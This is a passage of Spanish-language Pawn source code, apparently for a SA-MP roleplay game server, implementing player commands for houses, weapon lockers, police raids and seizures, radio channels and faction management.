				        format(x, sizeof(x), "Valor: %d   -   Nivel: %d", casa[h][hValue], casa[h][hLevel]);
				        Mensaje(playerid, COLOR_BLANCO, x);
				        format(x, sizeof(x), "Habitaciones Disponibles: %d", casa[h][hRooms]);
				        Mensaje(playerid, COLOR_BLANCO, x);
				        format(x, sizeof(x), "Armario: (Wep: %d - Ammo: %d)", casa[h][hWep], casa[h][hAmmo]);
				        Mensaje(playerid, COLOR_BLANCO, x);
				        format(x, sizeof(x), "Bloqueada: %d", casa[h][hLock]);
				        Mensaje(playerid, COLOR_BLANCO, x);
				        format(x, sizeof(x), "ID: %d", casa[h][hWorld]);
				        Mensaje(playerid, COLOR_BLANCO, x);
				        return 1;
					}
					if(casa[h][hRent] > 0 && cuenta[playerid][cCasa] != h)
				    {
				        Mensaje(playerid, COLOR_AMARILLO2, "- Propiedad en Renta - Información");
				        format(x, sizeof(x), "Dueño: %s", casa[h][hOwner]);
				        Mensaje(playerid, COLOR_BLANCO, x);
				        format(x, sizeof(x), "Interior ID: %d", casa[h][hInt]);
				        Mensaje(playerid, COLOR_BLANCO, x);
				        format(x, sizeof(x), "Habitaciones: %d", casa[h][hRooms]);
				        Mensaje(playerid, COLOR_BLANCO, x);
				        format(x, sizeof(x), "Renta: %d$", casa[h][hRent]);
				        Mensaje(playerid, COLOR_BLANCO, x);
				        Mensaje(playerid, COLOR_AMARILLO3, "- Utiliza /rcuarto, para rentar una habitación");
				        return 1;
					} else return Mensaje(playerid, COLOR_GRIS2, "No hay información disponible para esta propiedad!");
				}
			}
		} else Mensaje(playerid, COLOR_GRIS2, "Necesitas estar conectado!");
		return 1;
	}

    command(houseid, playerid, params[])
    {
        new string[32];
        for(new h = 0; h < sizeof(casa); h++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 1.0, casa[h][hEntrancex], casa[h][hEntrancey], casa[h][hEntrancez]))
			{
   				format(string, sizeof(string), "Casa ID: %d", h);
			    Mensaje(playerid, COLOR_GRIS2, string);
			    break;
			}
		}
		return 1;
    }
 	command(houseint, playerid, params[])
	{
 		if(cuenta[playerid][cAdministrador] < 2012)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
 		if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
   		if(sscanf(params, "i", params[0]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /houseint <Casa ID>");
		if(params[0] < 0 || params[0] >= MAX_HOUSES)return Mensaje(playerid, COLOR_GRIS2, "ID de casa errónea!");
			cuenta[playerid][cEntrada] = casa[params[0]][hWorld];
			SetPosEx(playerid, casa[params[0]][hExitx], casa[params[0]][hExity], casa[params[0]][hExitz], 0, casa[params[0]][hInt], casa[params[0]][hWorld]);
			Mensaje(playerid, COLOR_GRIS1, "Teleportado!");
			return 1;
	}
	
COMMAND:sarma(playerid, params[])
{
	new cas, idcas;
	if(sscanf(params, "d", cas))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /sarma [slot 1 - 2]");
	idcas = (cas == 1) ? (cuenta[playerid][cCasa]):(cuenta[playerid][cCasa2]); 
	
	if(idcas == 9999)return Mensaje(playerid, COLOR_ROJO, "No tienes casa.");
	if(IsPlayerInRangeOfPoint(playerid, 20.0, casa[idcas][hExitx], casa[idcas][hExity], casa[idcas][hExitz]) && GetPlayerVirtualWorld(playerid) == casa[idcas][hWorld])
	{
		if(casa[idcas][hWep] != 0)
		{
			darArma(playerid, casa[idcas][hWep], casa[idcas][hAmmo]);
			casa[idcas][hWep] = 0;
			casa[idcas][hAmmo] = 0;
			Mensaje(playerid, COLOR_AMARILLO2, "Sacaste tu arma de tu armario. Utiliza /garma para volverla a guardar.");
		}else Mensaje(playerid, COLOR_GRIS2, "No tienes un arma en tu armario.");
	}else Mensaje(playerid, COLOR_ROJO, "No estás en tu casa.");
	return 1;
}
COMMAND:garma(playerid, params[])
{
	new cas, idcas;
	if(sscanf(params, "d", cas))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /garma [slot 1 - 2]");
	idcas = (cas == 1) ? (cuenta[playerid][cCasa]):(cuenta[playerid][cCasa2]); 
	
	if(idcas == 9999)return Mensaje(playerid, COLOR_ROJO, "No tienes casa.");
	if(IsPlayerInRangeOfPoint(playerid, 20.0, casa[idcas][hExitx], casa[idcas][hExity], casa[idcas][hExitz]) && GetPlayerVirtualWorld(playerid) == casa[idcas][hWorld])
	{
		if(casa[idcas][hWep])return Mensaje(playerid, COLOR_ROJO, "Tu armario está lleno!");

		new gunID = GetPlayerWeapon(playerid);
		new gunAmmo = GetPlayerAmmo(playerid);
		if(gunID != 0 && gunAmmo != 0)
		{
			casa[idcas][hWep] = gunID;
			casa[idcas][hAmmo] = gunAmmo;
			RemovePlayerWeapon(playerid, gunID);
			Mensaje(playerid, COLOR_AMARILLO2, "Guardaste tu arma en tu armario. Utiliza /sarma para removerla.");
		}else Mensaje(playerid, COLOR_ROJO, "No tienes arma!");
	}else Mensaje(playerid, COLOR_ROJO, "No estás en tu casa.");
	return 1;
}
command(allanarcasa, playerid, params[])
{
	if(!IsACop(playerid))return Mensaje(playerid, COLOR_GRIS2, "No eres policia!");
	for(new i = 0; i < sizeof(casa); i++)
	{
		new string[128];
		if(IsPlayerInRangeOfPoint(playerid, 3.0, casa[i][hEntrancex], casa[i][hEntrancey], casa[i][hEntrancez]))
		{
			format(string, sizeof(string), "* %s coje saca un C4, lo activa y lo coloca en la puerta de la casa.", PlayerName(playerid));
			ProxDetector(20.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			ProxDetector(20.0, playerid, "* C4 (( Bip Bip Bip ))", 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF);
			ProxDetector(20.0, playerid, "La bomba esta a punto de explotar, cubranse!", COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
			SetTimerEx("TumbarPuerta", 10000, false, "ifff", playerid, casa[i][hEntrancex], casa[i][hEntrancey], casa[i][hEntrancez]);
			HouseExplo[playerid] = i;
			return 1;
		}
	}
	return 1;
}
command(revisarcasa, playerid, params[])
{
	new string[128];
	if(!IsACop(playerid))return Mensaje(playerid, COLOR_GRIS2, "No eres policia!");
	for(new i = 0; i < sizeof(casa); i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 20.0, casa[i][hExitx], casa[i][hExity], casa[i][hExitz]))
		{
			format(string, sizeof(string), "* %s revisa la casa en busca de materiales/drogas.", PlayerName(playerid));
			ProxDetector(20.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			Mensaje(playerid, COLOR_AMARILLO2, "============================== Inventario =============================");
			format(string, sizeof(string), "Materiales: %d - Drogas: %d - Speed: %d - Ectasy: %d - Ritalin: %d - Heroina: %d - Marihuana: %d", casa[i][hMats], 
			casa[i][hDrugs], casa[i][hSpeed], casa[i][hEctasy], casa[i][hRitalin], casa[i][hHeroina], casa[i][hMarihuana]);
			Mensaje(playerid, COLOR_BLANCO, string);
			return 1;
		}
	}
	return 1;
}
COMMAND:incautar(playerid, params[])
{
	if(Team_LSPD(playerid) || Team_FBI(playerid))
	{
		new string[128];
		for(new i = 0; i < sizeof(casa); i++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 20.0, casa[i][hExitx], casa[i][hExity], casa[i][hExitz]))
			{
				if(!casa[i][hMats] || !casa[i][hDrugs] || !casa[i][hSpeed] || !casa[i][hEctasy] || !casa[i][hRitalin] || !casa[i][hHeroina] || !casa[i][hMarihuana]) return Mensaje(playerid, COLOR_GRIS2, "Esta casa no tiene nada para incautar!");
				
				format(string, sizeof(string), "* %s toma la evidencia y las guarda.", PlayerName(playerid));
				ProxDetector(20.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
				
				casa[i][hMats] = 0;
				casa[i][hDrugs] = 0;
				casa[i][hSpeed] = 0;
				casa[i][hEctasy] = 0;
				casa[i][hRitalin] = 0;
				casa[i][hHeroina] = 0;
				casa[i][hMarihuana] = 0;
				
				format(string, sizeof(string), "* Central: %s ha incautado drogas/materiales en una casa de Los Santos.", PlayerName(playerid));
				return 1;
			}
		}
	}else return Mensaje(playerid, COLOR_GRIS2, "No eres policia!");
	return 1;
}

COMMAND:renta(playerid, params[])
{
	new cas, idcas, monto;
	if(sscanf(params, "dd", cas, monto))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /renta [slot 1 - 2][Monto $]");
	idcas = (cas == 1) ? (cuenta[playerid][cCasa]):(cuenta[playerid][cCasa2]);
	
	if(idcas == 9999)return Mensaje(playerid, COLOR_ROJO, "No posees una propiedad.");
	
	if(monto < 0 || monto > 1000)return Mensaje(playerid, COLOR_GRIS2, "Valor entre 1 - 1000$; 0 = No rentable");

	casa[idcas][hRent] = monto;
	OnPropTextdrawUpdate(idcas);
	new string[126];
	format(string, sizeof(string), "Renta de la propiedad: %d", casa[idcas][hRent]);
	Mensaje(playerid, COLOR_BLANCO, string);
	return 1;
}

COMMAND:abrir(playerid, params[])
{
	new cas, idcas;
	if(sscanf(params, "d", cas))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /abrir [slot 1 - 2]");
	idcas = (cas == 1) ? (cuenta[playerid][cCasa]):(cuenta[playerid][cCasa2]);
	
	if(idcas == 9999)return Mensaje(playerid, COLOR_ROJO, "No posees una casa.");
	if(IsPlayerInRangeOfPoint(playerid, 3.0, casa[idcas][hEntrancex], casa[idcas][hEntrancey], casa[idcas][hEntrancez]))
	{
		if(!casa[idcas][hLock])
		{
			casa[idcas][hLock] = 1;
			GameTextForPlayer(playerid, "~w~Puerta ~r~cerrada", 5000, 6);
			PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
		}
		else
		{
			casa[idcas][hLock] = 0;
			GameTextForPlayer(playerid, "~w~Puerta ~g~Abierta", 5000, 6);
			PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
		}
	}else Mensaje(playerid, COLOR_GRIS2, "No estás en la puerta de tu casa!");
	return 1;
}
COMMAND:cajafuerte(playerid, params[])
{
	new cas, idcas, monto, string[126];
	if(sscanf(params, "dd", cas, monto))
	{
		Mensaje(playerid, COLOR_GRIS2, "Utiliza: /cajafuerte [Slot 1 - 2][Monto $]");
		return 1;
	}
	idcas = (cas == 1) ? (cuenta[playerid][cCasa]):(cuenta[playerid][cCasa2]);
	if(idcas == 9999)return Mensaje(playerid, COLOR_ROJO, "No posees una casa.");
	
	if(monto > casa[idcas][hRentabil] || monto < 1)
	{
		format(string, sizeof(string), "Usted solo tiene disponible %d$", casa[idcas][hRentabil]);
		Mensaje(playerid, COLOR_GRIS2, string);
		return 1;
	}

	ganaDinero(playerid, monto);
	casa[idcas][hRentabil] -= monto;
	format(string, sizeof(string), "Extraiste %d$ de tu caja fuerte. Te quedan: %d$", monto, casa[idcas][hRentabil]);
	Mensaje(playerid, COLOR_AMARILLO2, string);
	return 1;
}

COMMAND:venderauto(playerid, params[])
{
	ShowPlayerDialog(playerid, DIALOGO_VENDER_AUTO, DIALOG_STYLE_MSGBOX, "Vender Auto", "{ffffff}Estas a punto de vender tu auto a un {ff0000}35% {ffffff}del valor por el cual lo compraste\n\n{ffffff}esta seguro de quererlo vender?", "Aceptar", "Cancelar");
	return 1;
}

 	command(asellhouse, playerid, params[])
    {
        if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "i", params[0]))
        {
        	new string[128];
            if(params[0] >= MAX_HOUSES || params[0] < 0)return Mensaje(playerid, COLOR_GRIS2, "ID incorrecto.");
            else{
				VenderPropiedad(playerid, params[0]);
            	format(string, sizeof(string), "Propiedad %d vendida.", params[0]);
				Mensaje(playerid, COLOR_GRIS2, string);
			}
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /asellhouse <HouseID>");
        return 1;
    }
    command(asellbizz, playerid, params[])
    {
        if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(!sscanf(params, "i", params[0]))
        {
        	new string[128];
            if(params[0] >= MAX_BIZZ || params[0] < 0)return Mensaje(playerid, COLOR_GRIS2, "ID incorrecto.");
            else{
				VenderLocal(params[0]);
            	format(string, sizeof(string), "Negocio %d vendido.", params[0]);
				Mensaje(playerid, COLOR_GRIS2, string);
			}
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /asellbizz <BizzID>");
        return 1;
   	}
	command(puntosrol, playerid, params[])
	{
	  new string[20];
	  if(Mostrar[playerid] == 0)
	  {
		Mostrar[playerid] = 1;
		TextdrawFunc(playerid);
		PlayerTextDrawShow(playerid, PuntosDeRolTextdraw0[playerid]);
        format(string, sizeof(string), "Puntos de Rol: %d", cuenta[playerid][cPuntosRol]);
	    PlayerTextDrawSetString(playerid, PuntosDeRolTextdraw0[playerid], string);
	  }
	  else if(Mostrar[playerid] == 1)
	  {
		Mostrar[playerid] = 0;
		PlayerTextDrawHide(playerid, PuntosDeRolTextdraw0[playerid]);
      } return 1;
	}

COMMAND:radio(playerid, params[])
{
	if(!cuenta[playerid][cMiembro])return Mensaje(playerid, COLOR_GRIS2, "Usted no puedo usar esto.");
	if(cuenta[playerid][cCarcel] > 0)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar esto aquí.");
	if(!booleano[OnDuty]{playerid} && cuenta[playerid][cMiembro] < 16)return Mensaje(playerid, COLOR_GRIS2, "No estás en servicio!");
	if(!booleano[RadioOn]{playerid})
	{
		booleano[RadioOn]{playerid} = true;
		Mensaje(playerid, COLOR_GRIS2, "Prendiste tu radio.");
	}
	else
	{
		booleano[RadioOn]{playerid} = false;
		Mensaje(playerid, COLOR_GRIS2, "Apagaste tu radio.");
	}
	return 1;
}
	
command(togfam, playerid, params[]){
	if(!booleano[FamiliaOficialOn]{playerid}){
		booleano[FamiliaOficialOn]{playerid} = true;
		Mensaje(playerid, COLOR_GRIS2, "Activaste tus canales de familia.");
	}else{
		booleano[FamiliaOficialOn]{playerid} = false;
		Mensaje(playerid, COLOR_GRIS2, "Desactivaste tus canales de familia.");
	}
	return 1;
}

command(duty, playerid, params[]){
        new string[128];
		if(Team_FBI(playerid)){
  		    if(IsPlayerInRangeOfPoint(playerid, 20.0, 222.3244, 186.7450, 1003.0313)){
            	if(!booleano[OnDuty]{playerid}){
        		    format(string, sizeof(string), "* %s coge su placa y su radio.", PlayerName(playerid));
        		    ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
        		    booleano[OnDuty]{playerid} = true;
      			}else{
        		    format(string, sizeof(string), "* %s deja su placa y su radio.", PlayerName(playerid));
        		    ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
        		    quitarArmas(playerid);
        		    booleano[OnDuty]{playerid} = false;
      			}
      		} else return Mensaje(playerid, COLOR_GRIS2, "No estás en el lugar adecuado.");
        }else if(Team_SAMUR(playerid)){
  			if(IsPlayerInRangeOfPoint(playerid, 20.0, -2652.1270, 504.4646, 48.0835))
  			{
            	if(!booleano[OnDuty]{playerid})
      			{
 			    	booleano[OnDuty]{playerid} = true;
					Mensaje(playerid, COLOR_BLANCO, "* Estas de servicio, recibirás llamadas.");
					format(string, sizeof(string), "{FFB6C1}* Medico/Bombero %s está en servicio, llamar al 911.", PlayerName(playerid));
                    OOCNews(-1, string);
    			}
      			else
			  	{
		    		booleano[OnDuty]{playerid} = false;
 			    	Mensaje(playerid, COLOR_BLANCO, "* Terminaste tu servicio, ya no recibirás llamadas.");
      			}
			}  else return Mensaje(playerid, COLOR_GRIS2, "No estás en el lugar adecuado.");
        }
        else if(Team_Mecanicos(playerid))
		{
          if(IsPlayerInRangeOfPoint(playerid, 20.0, 2124.6816, -2272.2881, 20.6719))
          {
            if(!booleano[OnDuty]{playerid})
      		{
      		    	booleano[OnDuty]{playerid} = true;
        		    format(string, sizeof(string), "{00E45B}* Mecánico %s está en servicio, venga al taller o llame al {FFFFFF}(Tlf. %d)", PlayerName(playerid), cuenta[playerid][cTelefono]);
                    OOCNews(-1, string);
    		}
      		else{
        		    booleano[OnDuty]{playerid} = false;
        		    Mensaje(playerid, COLOR_BLANCO, "* Terminaste tu servicio, ya no recibirás llamadas.");
        		    format(string, sizeof(string), "{AA3333}* Mecánico %s está fuera de servicio.", PlayerName(playerid));
                    OOCNews(-1, string);
      		}
		  } else return Mensaje(playerid, COLOR_GRIS2, "No estás en el lugar adecuado.");
        }
        else if(Gobierno(playerid) || EsPeriodista(playerid)){
			if(!booleano[OnDuty]{playerid})
			{
			        booleano[OnDuty]{playerid} = true;
					Mensaje(playerid, COLOR_BLANCO, "* Estas de servicio, puedes encender tu radio.");
			}
			else{
			        booleano[OnDuty]{playerid} = false;
			        Mensaje(playerid, COLOR_BLANCO, "* Terminaste tu servicio, ya no puedes usar tu radio.");
   			}
		}
      	else Mensaje(playerid, COLOR_GRIS2, "No puedes usar este comando!");
        return 1;
    }
    // Walkie Talkie
    command(walkie, playerid, params[])
	{
		if(estaSilenciado(playerid))return 1;
        if(!sscanf(params, "s[32]", params[0])){
			if(cuenta[playerid][cWalkie] == 0)    return Mensaje(playerid, COLOR_GRIS2, "No tiene un Walkie Talkie.");
			if(cuenta[playerid][cCarcel] > 0)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar esto aquí.");
            if(strcmp(params[0], "prender", true) == 0){
			    if(!booleano[RadioOn]{playerid}){
			    	return booleano[RadioOn]{playerid} = true, 
			    	PFrecuencia[playerid] = 0, 
				    Mensaje(playerid, COLOR_VERDE, "* Walkie-Talkie encendido.");
			    }
				else Mensaje(playerid, COLOR_GRIS2, "* Ya está prendido.");
			}
			else if(strcmp(params[0], "apagar", true) == 0){
			    if(booleano[RadioOn]{playerid}){
			    	return booleano[RadioOn]{playerid} = false, 
			    	PFrecuencia[playerid] = 0, 
			    	Mensaje(playerid, COLOR_ROJO, "* Walkie-Talkie fue apagado.");
			    }
				else Mensaje(playerid, COLOR_GRIS2, "* Ya está apagado.");
			}
        }
        else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /walkie <prender, apagar>");
        return 1;
    }
    command(frecuencia, playerid, params[]){
        if(cuenta[playerid][cWalkie] > 0 && booleano[RadioOn]{playerid}){
            new string[128];
            if(!sscanf(params, "i", params[0])){
					if(params[0] < 1 || params[0] > 9999)
						return Mensaje(playerid, TEAM_RADIO_COLOR, "* Conéctese a un canal entre '1' y '9999'.");
						PFrecuencia[playerid] = params[0], 
						format(string, sizeof string, "* Ahora tu frecuencia es: '%d'.", PFrecuencia[playerid]), 
						Mensaje(playerid, COLOR_VERDE, string);
            }
            else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /frecuencia <Nro> entre 1 - 9999");
        }
        else Mensaje(playerid, COLOR_GRIS2, "* No tienes una radio con la que hablar / o está apagada.");
        return 1;
    }
    command(wt, playerid, params[])
	{
		if(estaSilenciado(playerid))return 1;
        if(palabrasProhibidas(params[0]))return AccionSPAM(playerid, params[0]);
        if(cuenta[playerid][cCarcel] > 0)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar esto aquí.");
        if(!booleano[RadioOn]{playerid})return Mensaje(playerid, COLOR_GRIS2, "* Radio apagada. Utiliza: '/walkie prender'");
       	if(PFrecuencia[playerid] == 0)return Mensaje(playerid, COLOR_GRIS2, "* No estás en ninguna frecuencia. Utiliza: '/frecuencia'");
		if(!sscanf(params, "s[128]", params[0]))
		{
		    new string[128];
			format(string, sizeof string, "* (F#%d) %s: %s", PFrecuencia[playerid], PlayerName(playerid), params[0]);
			for(new i=0, t=GetMaxPlayers();i<t;i++)
			{
				if(IsPlayerConnected(i) && booleano[RadioOn]{i})
				{
					if(PFrecuencia[i] == PFrecuencia[playerid])
					{
						Mensaje(i, 0xDFD575FF, string);
					}
				}
			}
			format(string, sizeof(string), "* (WT) %s: %s", PlayerName(playerid), params[0]);
            ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
		else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /wt <Mensaje>");
        return 1;
    }
    command(irccanal, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        	if(!sscanf(params, "ui", params[0], params[1])){
            if(IsPlayerConnected(params[0])){
			new string[128];
			if(params[1] < 1 || params[1] > 15)return Mensaje(playerid, TEAM_RADIO_COLOR, "* Canales entre '1' y '15'.");
                CanalIRC[params[0]] = params[1];
    			format(string, sizeof(string), "{40D3FF}%s lo ha metido en el canal numero %d", PlayerName(playerid), params[1]);
			    Mensaje(params[0], -1, string);
            } else Mensaje(playerid, COLOR_GRIS2, " Jugador no conectado.");
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /irccanal <ID> <Canal>");
        return 1;
    }
    command(i, playerid, params[])
	{
        if(palabrasProhibidas(params[0]))return AccionSPAM(playerid, params[0]);
       	if(CanalIRC[playerid] == 0)return Mensaje(playerid, COLOR_GRIS2, "* No estás en ningun canal.");
		if(!sscanf(params, "s[128]", params[0]))
		{
		    new string[128];
			format(string, sizeof string, "(Canal#%d) %s: %s", CanalIRC[playerid], PlayerName(playerid), params[0]);
			for(new i=0, t=GetMaxPlayers();i<t;i++)
			{
				if(IsPlayerConnected(i))
				{
					if(CanalIRC[i] == CanalIRC[playerid])
					{
						Mensaje(i, 0xDFD575FF, string);
					}
				}
			}
		}
		else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /i <Mensaje>");
        return 1;
    }
	command(d, playerid, params[])
    {
        if(palabrasProhibidas(params[0]))return AccionSPAM(playerid, params[0]);
        if(!booleano[RadioOn]{playerid})return Mensaje(playerid, COLOR_GRIS2, "Tu radio está apagada!");
        if(!sscanf(params, "s[128]", params[0])){
			if(IsACop(playerid)|| Team_SAMUR(playerid) || Gobierno(playerid) || Team_FBI(playerid)){
			    new string[128];
	    		format(string, sizeof(string), "** %s %s: %s **", PlayerStatInfo[playerid][4], PlayerName(playerid), params[0]);
				SendRadioMessage(1, COLOR_CIAN, string);
				SendRadioMessage(2, COLOR_CIAN, string);
				SendRadioMessage(3, COLOR_CIAN, string);
				SendRadioMessage(6, COLOR_CIAN, string);
				SendRadioMessage(9, COLOR_CIAN, string);
				SendRadioMessage(10, COLOR_CIAN, string);
				format(string, sizeof(string), "* (Radio) %s: %s", PlayerName(playerid), params[0]);
     			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
			} else Mensaje(playerid, COLOR_GRIS2, "No eres parte de un equipo!");
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /d <Texto>");
        return 1;
    }
	command(f, playerid, params[])
    {
		if(estaSilenciado(playerid))return 1;
        if(palabrasProhibidas(params[0]))return AccionSPAM(playerid, params[0]);
        if(!sscanf(params, "s[128]", params[0]))
        {
            if(cuenta[playerid][cLider] == 0 && cuenta[playerid][cMiembro] == 0) 	return Mensaje(playerid, COLOR_GRIS2, "No perteneces a ninguna facción.");
            new string[128];
			UpdatePlayerStat(playerid);
    		format(string, sizeof(string), "** (( %s %s: %s )) **", PlayerStatInfo[playerid][4], PlayerName(playerid), params[0]);
			
			if(cuenta[playerid][cLider] > 0) 	SendFamilyMessage(cuenta[playerid][cLider], 0x00E5FFDC, string);
	   		else 									SendFamilyMessage(cuenta[playerid][cMiembro], 0x7BDDA5AA, string);
        }
        else Mensaje(playerid, COLOR_GRIS2, "Utiliza: (/f)accion <texto>");
        return 1;
    }

command(r, playerid, params[]){
	new string[128];
	if(palabrasProhibidas(params[0]))return AccionSPAM(playerid, params[0]); 
	if(!booleano[RadioOn]{playerid})return Mensaje(playerid, COLOR_GRIS2, "Tu radio está apagada.");
	if(cuenta[playerid][cCarcel] > 0)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar esto aquí.");
	if(!sscanf(params, "s[128]", params[0])){
		if(cuenta[playerid][cLider] > 0){
			format(string, sizeof(string), "** %s %s: %s", PlayerStatInfo[playerid][4], PlayerName(playerid), params[0]);
			SendRadioMessage(cuenta[playerid][cLider], TEAM_RADIO_COLOR, string);
		}else{
			format(string, sizeof(string), "* (Radio) %s: %s", PlayerName(playerid), params[0]);
			SendRadioMessage(cuenta[playerid][cMiembro], TEAM_RADIO_COLOR, string);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		}
	} else return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /r <Texto>");
	return 1;
}

command(contratar, playerid, params[]){
	if(cuenta[playerid][cLider] > 0){
		if(!sscanf(params, "u", params[0])){
			if(IsPlayerConnected(params[0])){
				if(dDistanciaJugador(8.0, playerid, params[0])){
					if(params[0] == playerid)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes invitarte a ti mismo!");
					if(booleano[Facturing]{params[0]})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Este jugador está en otra tarea, espera.");
					if(cuenta[params[0]][cMiembro] > 0 || cuenta[params[0]][cLider] > 0)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Este jugador ya tiene facción.");
					new string[186];
					switch(cuenta[playerid][cLider]){
						case 1: ReqF_Name[params[0]] = "Policía Local LS";
						case 2: ReqF_Name[params[0]] = "Ejército Militar";
						case 3: ReqF_Name[params[0]] = "Hospital Nacinoal";
						case 4: ReqF_Name[params[0]] = "Los Santos Customs";
						case 5: ReqF_Name[params[0]] = "Gobierno de Fort Carson";
						case 6: ReqF_Name[params[0]] = "Gobierno";
						case 7: ReqF_Name[params[0]] = "CNN";
						case 9: ReqF_Name[params[0]] = "FBI";
					}
					ReqF_Faction[params[0]] = cuenta[playerid][cLider];
					booleano[Facturing]{params[0]} = true;
					format(string, sizeof(string), "\t{FFFFFF}Invitación hacia una facción:\n\n\n\n\n{FFFFFF}Reclutante: {7175AC}%s \n{FFFFFF}Organización: {EFF500}%s\n\n\n\t{FFFFFF}     ¿Qué acción deseas realizar?", PlayerName(playerid), ReqF_Name[params[0]]);
					ShowPlayerDialog(params[0], REQF_ACCEPT, DIALOG_STYLE_MSGBOX, "{EFF500}OFERTA DE TRABAJO!", string, "Aceptar", "Rechazar");
				} else Mensaje(playerid, COLOR_GRIS2, "Jugador muy lejos.");
			} else Mensaje(playerid, COLOR_GRIS2, "Jugador desconectado.");
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /contratar <PlayerID>");
	} else Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no es lider de facción.");
	return 1;
}
	command(despedir, playerid, params[])
    {
        if(cuenta[playerid][cLider] == 0)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no es lider de facción.");
		if(sscanf(params, "u", params[0]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /despedir <PlayerID>");
		if(!IsPlayerConnected(params[0]))return Mensaje(playerid, COLOR_GRIS2, "Jugador desconectado.");
        if(cuenta[playerid][cLider] == cuenta[params[0]][cMiembro])
		{
			new string[80];
			format(string, sizeof(string), "  Tu líder %s te ha despedido", PlayerName(playerid));
			Mensaje(params[0], COLOR_ROJO, "--- [ Contrato de Trabajo Terminado ] --");
			Mensaje(params[0], COLOR_BLANCO, string);
			format(string, sizeof(string), "  Despediste a %s", PlayerName(params[0]));
			Mensaje(playerid, COLOR_BLANCO, string);
			cuenta[params[0]][cMiembro] = 0;
			cuenta[params[0]][cRango] = 0;
			UpdatePlayerStat(params[0]);
			SetPlayerSkin(params[0], 299);
		} else Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} El jugador no pertenece a tu facción.");
        return 1;
    }
	
command(ascender, playerid, params[]){
	if(!sscanf(params, "ui", params[0], params[1])){
		if(params[1] > 8 || params[1] < 0)return Mensaje(playerid, COLOR_GRIS, "No hay rango tan alto!");
		if(cuenta[playerid][cLider] == 0)return Mensaje(playerid, COLOR_GRIS2, "No eres líder de facción.");
		if(IsPlayerConnected(params[0])){
			if(cuenta[params[0]][cLider] > 0)return Mensaje(playerid, COLOR_GRIS2, "No puedes asignar rango a un líder!");
			if(cuenta[playerid][cLider] == cuenta[params[0]][cMiembro]){
				new string[128];
				cuenta[params[0]][cRango] = params[1];
				UpdatePlayerStat(params[0]);
				format(string, sizeof(string), "Líder %s asignó rango %d al miembro %s", PlayerName(playerid), cuenta[params[0]][cRango], PlayerName(params[0]));
				Mensaje(params[0], COLOR_AZUL_CLARO, string);
				Mensaje(playerid, COLOR_AZUL_CLARO, string);
			} else Mensaje(playerid, COLOR_GRIS2, "Este miembro no es de tu facción!");
